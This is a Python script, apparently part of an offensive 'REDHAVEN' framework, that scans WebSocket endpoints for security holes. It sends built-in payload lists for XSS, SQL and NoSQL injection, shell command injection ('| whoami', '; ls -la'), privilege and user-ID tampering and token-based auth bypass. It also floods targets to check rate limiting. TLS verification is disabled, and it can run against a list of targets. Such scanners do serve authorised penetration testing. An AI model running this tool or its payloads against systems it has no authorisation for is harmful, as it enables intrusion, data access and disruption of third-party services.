#!/usr/bin/env python3
import sys
import asyncio
import argparse
import websockets
import json
import ssl
import re

# ============================================================================
# WEBSOCKET HUNTER v2.0
# Part of REDHAVEN Framework - REAL VULNERABILITY TESTING
# ============================================================================

BANNER = """
  (  (    (     
  )\\ )\\   )\\ )  
 ((_|(_) (()/(  
 _\\ / _ \\ )(_)) 
 \\ V / \\ /| || |
  \\_/ \\_/  \\_, | WebSocket Hunter v2.0 (Vulnerability Tester)
           |__/ 
"""

# Comprehensive payload suite
PAYLOADS = {
    'info_disclosure': [
        'INVALID_MESSAGE_TEST',
        '{"test": true}',
        '',
    ],
    'xss': [
        '<script>alert(document.domain)</script>',
        '"><script>alert(1)</script>',
        '{"message": "<img src=x onerror=alert(1)>"}',
    ],
    'sqli': [
        "' OR 1=1 --",
        '" OR "1"="1',
        '{"id": "1\' OR \'1\'=\'1"}',
    ],
    'nosqli': [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
    ],
    'command_injection': [
        '{"cmd": "ls -la"}',
        '"; ls -la #',
        '| whoami',
    ],
    'message_injection': [
        '{"user_id": 1}',
        '{"user_id": 2}',
        '{"user_id": 999999}',
        '{"admin": true}',
        '{"role": "admin"}',
    ],
    'auth_bypass': [
        '{"token": ""}',
        '{"token": null}',
        '{"Authorization": "Bearer invalid"}',
    ]
}

async def test_websocket_advanced(url, test_auth=True, test_injections=True):
    """Advanced WebSocket testing with real vulnerability probes."""
    print(f"\n[*] Testing: {url}")
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    
    findings = []
    
    try:
        async with websockets.connect(url, ssl=ssl_context if "wss://" in url else None, timeout=5) as websocket:
            print(f"[+] Connected to {url}")
            
            # ===== 1. INFORMATION DISCLOSURE TEST =====
            await websocket.send("REDHAVEN_PROBE")
            try:
                response = await asyncio.wait_for(websocket.recv(), timeout=2)
                print(f"    [i] Initial response: {str(response)[:100]}")
                
                # Check for verbose error messages
                if any(keyword in str(response).lower() for keyword in ['error', 'exception', 'stack', 'debug']):
                    findings.append(f"Info Disclosure: Verbose error messages")
                    print(f"    [!] Verbose error detected")
                    
            except asyncio.TimeoutError:
                print(f"    [-] No response to probe")
            
            # ===== 2. MESSAGE INJECTION TEST =====
            if test_injections:
                print(f"    [*] Testing message injection...")
                for payload in PAYLOADS['message_injection']:
                    try:
                        await websocket.send(payload)
                        response = await asyncio.wait_for(websocket.recv(), timeout=1)
                        
                        # Parse if JSON
                        try:
                            resp_json = json.loads(response)
                            if 'user_id' in str(resp_json) or 'admin' in str(resp_json):
                                findings.append(f"Message Injection: Server processed modified parameters")
                                print(f"    [!] Injection successful: {payload[:50]}")
                        except:
                            pass
                            
                    except Exception as e:
                        pass
            
            # ===== 3. XSS TEST =====
            print(f"    [*] Testing XSS reflection...")
            for xss_payload in PAYLOADS['xss'][:2]:  # Test first 2 to avoid spam
                try:
                    await websocket.send(json.dumps({"message": xss_payload}))
                    response = await asyncio.wait_for(websocket.recv(), timeout=1)
                    
                    if '<script>' in str(response) or 'onerror=' in str(response):
                        findings.append(f"XSS: Payload reflected unescaped")
                        print(f"    [!!!] XSS VULNERABLE: Payload reflected")
                        break
                except:
                    pass
            
            # ===== 4. SQL INJECTION TEST =====
            print(f"    [*] Testing SQL injection...")
            for sqli_payload in PAYLOADS['sqli'][:2]:
                try:
                    await websocket.send(sqli_payload)
                    response = await asyncio.wait_for(websocket.recv(), timeout=1)
                    
                    # Check for SQL error keywords
                    sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'syntax error']
                    if any(err in str(response).lower() for err in sql_errors):
                        findings.append(f"SQLi: Database error in response")
                        print(f"    [!!!] SQL ERROR DETECTED")
                        break
                except:
                    pass
            
            # ===== 5. COMMAND INJECTION TEST =====
            print(f"    [*] Testing command injection...")
            for cmd_payload in PAYLOADS['command_injection'][:2]:
                try:
                    await websocket.send(json.dumps({"command": cmd_payload}))
                    response = await asyncio.wait_for(websocket.recv(), timeout=1)
                    
                    # Check for command output patterns
                    if re.search(r'(root:|bin/|usr/|total \d+)', str(response)):
                        findings.append(f"Command Injection: Command output detected")
                        print(f"    [!!!] COMMAND INJECTION VULNERABLE")
                        break
                except:
                    pass
            
            # ===== 6. AUTH BYPASS TEST =====
            if test_auth:
                print(f"    [*] Testing authentication bypass...")
                for auth_payload in PAYLOADS['auth_bypass']:
                    try:
                        await websocket.send(auth_payload)
                        response = await asyncio.wait_for(websocket.recv(), timeout=1)
                        
                        # If we get success/data without auth, it's a problem
                        if any(keyword in str(response).lower() for keyword in ['success', 'data', 'user', 'message']):
                            findings.append(f"Auth Bypass: Server responds without authentication")
                            print(f"    [!] Auth bypass possible")
                            break
                    except:
                        pass
            
            # ===== 7. RATE LIMITING TEST =====
            print(f"    [*] Testing rate limiting...")
            rate_test_count = 50
            blocked = False
            for i in range(rate_test_count):
                try:
                    await websocket.send(f"RATE_TEST_{i}")
                    response = await asyncio.wait_for(websocket.recv(), timeout=0.5)
                    
                    if 'limit' in str(response).lower() or 'too many' in str(response).lower():
                        blocked = True
                        print(f"    [+] Rate limiting active (blocked at {i} requests)")
                        break
                except:
                    pass
            
            if not blocked:
                findings.append(f"No Rate Limiting: {rate_test_count} messages sent without block")
                print(f"    [!] No rate limiting detected")
            
            return True, findings
            
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False, []

def convert_http_to_ws(url):
    """Convert HTTP(S) URLs to WS(S) URLs."""
    if url.startswith("https://"):
        return url.replace("https://", "wss://")
    elif url.startswith("http://"):
        return url.replace("http://", "ws://")
    return url

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="Advanced WebSocket Vulnerability Scanner")
    parser.add_argument("-u", "--url", help="Target URL (HTTP/HTTPS or WS/WSS)")
    parser.add_argument("-l", "--list", help="List of URLs to test")
    parser.add_argument("--no-auth-test", action="store_true", help="Skip authentication bypass tests")
    parser.add_argument("--no-injection-test", action="store_true", help="Skip injection tests")
    
    args = parser.parse_args()
    
    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"[X] Error reading list: {e}")
            
    if not targets:
        print("[X] No targets specified.")
        print("Usage: ws_scanner.py -u https://example.com/socket")
        sys.exit(1)
            
    print(f"[*] Testing {len(targets)} WebSocket endpoints...\n")
    
    # Run async loop
    loop = asyncio.get_event_loop()
    
    all_findings = {}
    
    for url in targets:
        ws_url = convert_http_to_ws(url)
        is_open, findings = loop.run_until_complete(
            test_websocket_advanced(
                ws_url, 
                test_auth=not args.no_auth_test,
                test_injections=not args.no_injection_test
            )
        )
        
        if is_open and findings:
            all_findings[ws_url] = findings
    
    # Final report
    if all_findings:
        print("\n" + "="*70)
        print("[+] WEBSOCKET VULNERABILITIES FOUND:")
        print("="*70)
        for ws_url, findings in all_findings.items():
            print(f"\n>> {ws_url}")
            for finding in findings:
                print(f"   - {finding}")
    else:
        print("\n[-] No WebSocket vulnerabilities detected.")

if __name__ == "__main__":
    main()
